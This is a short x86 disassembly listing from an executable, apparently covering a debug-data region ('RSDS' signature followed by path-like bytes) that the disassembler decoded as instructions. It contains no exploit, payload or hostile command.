  42ab6f:	add    BYTE PTR [edx+0x0],al
  42ab72:	add    BYTE PTR [eax],al
  42ab74:	push   edx
  42ab75:	push   ebx
  42ab76:	inc    esp
  42ab77:	push   ebx
  42ab78:	jne    0x42ab06
  42ab7a:	jle    0x42ab9c
  42ab7c:	push   edx
  42ab7d:	popf   
  42ab7e:	cmp    al,0x4d
  42ab80:	lods   eax,DWORD PTR ds:[esi]
  42ab81:	xchg   ecx,eax
  42ab82:	cmp    al,0xc0
  42ab84:	cld    
  42ab85:	sub    eax,0x1c5229
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	push   ecx
  42ab8d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab91:	js     0x42abe8
  42ab93:	jbe    0x42ac07
  42ab95:	arpl   WORD PTR [esi+0x75],dx
  42ab98:	popa   
  42ab99:	push   esi
  42ab9a:	pop    esp
  42ab9b:	outs   dx,DWORD PTR ds:[esi]
  42ab9c:	ins    DWORD PTR es:[edi],dx
  42ab9d:	dec    eax
  42ab9e:	inc    edi
  42ab9f:	push   0x6c445178
  42aba4:	jbe    0x42ac17
  42aba6:	pop    esp
  42aba7:	push   0x70
  42aba9:	js     0x42ac0c
  42abab:	ins    BYTE PTR es:[edi],dx
  42abac:	ins    BYTE PTR es:[edi],dx
  42abad:	dec    eax
  42abae:	addr16 pop esp
  42abb0:	push   0x4a
  42abb2:	jb     0x42ac16
  42abb4:	push   esp
  42abb5:	ins    DWORD PTR es:[edi],dx
  42abb6:	push   edx
  42abb7:	bound  eax,QWORD PTR [edi+0x6d]
  42abba:	push   eax
  42abbb:	arpl   WORD PTR [esi+0x77],ax
  42abbe:	pop    esp
  42abbf:	jo     0x42ac2b
  42abc1:	dec    ecx
  42abc2:	inc    ebp
  42abc3:	push   bp
  42abc5:	ins    BYTE PTR es:[edi],dx
  42abc6:	inc    ebp
  42abc7:	dec    ebp
  42abc8:	jne    0x42ac41
  42abca:	jbe    0x42ac15
  42abcc:	cs jo  0x42ac33
  42abcf:	bound  eax,QWORD PTR [eax]
	...
